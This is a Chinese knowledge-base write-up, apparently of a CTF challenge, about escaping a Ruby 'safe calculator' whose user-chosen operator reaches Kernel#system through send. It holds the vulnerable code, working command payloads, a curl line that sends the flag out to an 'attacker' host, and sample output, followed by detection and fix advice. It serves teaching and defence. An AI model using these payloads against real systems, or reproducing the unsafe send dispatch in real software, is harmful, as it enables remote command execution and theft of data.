---
id: binary-pwn-sandbox-escape-ruby-send-calculator-method-dispatch-rce
title: Ruby 计算器沙箱：用户可控操作符经 send 动态派发到 Kernel#system
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: ruby-send-user-controlled-method-dispatch-rce
tags:
- ruby
- send
- metaprogramming
- sandbox-escape
- ctf
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V168
  verified_at: '2026-11-06T10:02:47+08:00'
  notes: 已对照原文SUS-Calculator核对：Calc.send(op.to_sym,left,right)、ls system -l/cat system flag.txt 输出与flag一致；未验证点：未复跑。
url: /docs/binary/pwn/sandbox-escape/binary-pwn-sandbox-escape-ruby-send-calculator-method-dispatch-rce/
draft: false
kb_aliases:
- SUS-Calculator
- Ruby send 注入
- Calc.send
- 元编程方法调用
- send 任意方法派发
---

## 一句话结论

Ruby 的“安全计算器”如果从用户输入里取操作符并直接 `Calc.send(op.to_sym, left, right)`，就等于让用户选择调用任意方法；`send` 会忽略 private/protected 可见性，`Kernel#system` 又混入在 `Object` 上，因此输入 `ls system -l` 就会执行 `system("ls", "-l")`，输入 `cat system flag.txt` 直接读出 flag。

## 原理

- `Object#send(symbol, *args)` 是 Ruby 的元编程入口：它按符号调用接收者的对应方法，并且**不受 private/protected 限制**（`public_send` 才有可见性限制）。
- `Kernel` 模块被混入 `Object`，所以 `system`、`exec`、`` ` ``、`open`、`IO.popen` 等方法在所有对象上都可用。`Calc` 虽然是自定义类，也继承了这些方法。
- 题目代码把 `cmd = gets.chomp.split` 的三个字段直接当作 `left, op, right`，再执行 `Calc.send(op.to_sym, left, right)`。攻击者只需让第二个字段是 `system`，第一、三个字段是命令和参数：
  - `ls system -l` → `Calc.send(:system, "ls", "-l")` → `system("ls", "-l")`；
  - `cat system flag.txt` → `Calc.send(:system, "cat", "flag.txt")` → `system("cat", "flag.txt")`。
- 返回值 `true` 被 `puts` 打印，因此交互里每次命令后都会看到 `true`；命令输出直接进入标准输出。
- 本质：把“方法名”作为数据交给动态派发 API，等价于把攻击面从“固定几个算术运算”扩大到“对象可调用的全部方法”。

## 触发条件

- 应用允许用户控制传给 `send`/`__send__`/`public_send`/`method` 的方法名。
- 接收者（这里是 `Calc` 类对象）能沿继承链访问到危险方法（`Kernel#system`、`exec`、`open`、`eval` 等）。
- 参数个数/类型能匹配目标方法的签名（`system(cmd)` 或 `system(cmd, arg...)` 都可以）。
- 进程以有文件读权限的用户运行。

## 利用步骤

1. 正常提交 `1 + 1` 确认程序按 `left op right` 解析，并观察返回格式。
2. 提交 `id system` 或 `ls system -l`，确认 `send` 把 `system` 当方法名执行。
3. 读取 flag：`cat system flag.txt`；需要 shell 时用 `sh system -c 'cat flag.txt'` 或 `bash system -c ...`。
4. 若输出被过滤，用 `curl system http://attacker/?x=$(cat flag.txt)` 外带（注意 split 会按空格切分，必要时用 `sh system -c` 把整条命令放在一个参数里）。
5. 若 `system` 被禁用，尝试 `exec`、`IO.popen`、`open`、`instance_eval`、`class_eval` 等同继承链方法。

## PoC

```ruby
# 题目核心
class Calc
  def self.+ left, right
    left = left.to_i if left.is_a? String
    right = right.to_i if right.is_a? String
    return left + right
  end
  # - * / % 同理
end

loop do
  print "> "
  cmd = gets.chomp.split
  left, op, right = cmd
  puts Calc.send(op.to_sym, left, right)
end
```

```text
SUS Calculator (Super Ultra Safe Calculator)
> ls system -l
total 8
-r--r--r-- 1 nobody nogroup   28 Jul  3 02:25 flag.txt
-rwxr-xr-x 1 nobody nogroup 1164 Jul  2 06:11 run
true
> cat system flag.txt
jail{me_when_i_uhhh_escape}
true
```

## 变体与关联

- `public_send` 仍然会调用 public 的 `system`（`Kernel#system` 是 private，但 `public_send` 会拒绝 private；若代码用 `public_send`，可改找 public 的 `open`、`eval` 等）。
- 其它动态派发：`method(op).call`、`Object.const_get(op)`、`instance_eval(op)`、`class_eval`、`define_method`。
- 与 Python `getattr(obj, user_input)(...)`、JavaScript `obj[user_input](...)` 属于同一类“动态成员访问”漏洞，只是 Ruby `send` 连 private 都能碰。
- 关联：[[binary-pwn-sandbox-escape-python-jail-subclass-traversal]]（Python 侧通过属性/子类遍历到危险 sink 的对应思路）。
- 边界：若操作符被严格限制为 `+ - * / %` 的符号白名单（例如 `case op`），或接收者被替换成不继承 `Object` 的 `BasicObject` 且没有 Kernel，本手法失效；参数切分也会影响带空格的命令，需要用 `sh -c` 包一层。

## 检测与防御

- 检测：搜索代码中的 `send(`、`__send__`、`public_send`、`method(`、`instance_eval`，确认第一个参数是否来自用户输入；对操作符字段出现非 `+ - * / %` 的值告警。
- 修复：不要动态派发用户输入；用 `case op when '+' then ... when '-' then ...` 的显式白名单，或把操作符映射到固定的 lambda 表，未知操作符直接拒绝。
- 加固：计算器进程以低权限用户运行，工作目录不含 flag；禁用 `Kernel#system`/`exec`/`open` 不现实，根本办法是不要把方法名交给用户。
